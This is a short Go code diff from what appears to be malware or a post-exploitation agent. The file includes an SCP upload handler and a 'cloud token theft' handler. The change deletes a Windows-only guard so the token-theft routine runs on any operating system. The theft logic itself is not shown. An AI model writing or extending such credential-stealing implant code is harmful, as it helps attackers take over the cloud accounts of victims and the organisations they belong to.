@@ -23,10 +23,6 @@ func handleSCPUpload(task Task, res *TaskResult) {
 
 // Cloud token theft handlers
 func handleCloudTokenTheft(task Task, res *TaskResult) {
-	if runtime.GOOS != "windows" {
-		res.Error = "Windows only"
-		return
-	}
 	handleCloudTokenTheftImpl(task, res)
 }
 
